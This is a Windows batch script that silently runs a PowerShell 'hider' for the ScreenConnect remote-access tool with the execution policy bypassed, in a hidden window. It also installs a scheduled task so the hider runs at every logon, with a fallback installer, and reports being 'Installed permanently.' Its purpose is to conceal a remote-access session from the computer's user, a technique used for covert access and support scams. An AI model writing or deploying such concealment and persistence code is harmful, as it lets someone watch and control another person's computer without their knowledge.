@echo off
setlocal EnableExtensions
cd /d "%~dp0"

set "PS=%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe"
set "TASK=HideScreenConnectUI"
set "SCRIPT=%~dp0hide-sc.ps1"

if not exist "%SCRIPT%" (
    echo ERROR: hide-sc.ps1 not found
    exit /b 1
)

echo Starting hider now...
start "" /B "%PS%" -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File "%SCRIPT%"

echo Installing at login...
schtasks /Delete /TN "%TASK%" /F >nul 2>&1
schtasks /Create /TN "%TASK%" /TR "\"%PS%\" -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File \"%SCRIPT%\"" /SC ONLOGON /F
if errorlevel 1 (
    echo schtasks failed, trying PowerShell install...
    "%PS%" -NoProfile -ExecutionPolicy Bypass -File "%~dp0install.ps1"
    exit /b %errorlevel%
)

echo SUCCESS - Installed permanently.
exit /b 0
